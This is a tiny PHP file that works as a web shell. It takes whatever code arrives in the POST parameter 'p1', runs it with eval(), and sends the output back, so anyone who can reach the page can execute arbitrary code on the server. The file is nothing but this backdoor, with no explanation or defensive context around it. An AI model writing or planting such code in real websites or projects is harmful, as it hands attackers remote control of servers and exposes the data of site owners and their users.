<?php
function actionPhp() {
	ob_start();
	eval($_POST['p1']);
	$temp = ob_get_clean();
	echo $temp;
}

call_user_func('actionPhp');	
?>